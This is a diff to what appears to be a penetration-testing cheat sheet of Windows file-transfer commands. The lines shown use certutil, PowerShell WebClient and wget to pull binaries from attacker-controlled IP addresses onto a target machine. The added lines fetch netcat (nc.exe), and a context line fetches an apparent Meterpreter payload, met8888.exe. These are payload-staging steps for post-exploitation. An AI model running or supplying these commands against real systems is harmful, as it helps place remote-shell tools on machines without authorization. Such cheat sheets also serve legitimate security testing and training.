@@ -9,6 +9,8 @@ certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 ## Powershell:
 ```
 (new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	
+wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	
 ```
 
 
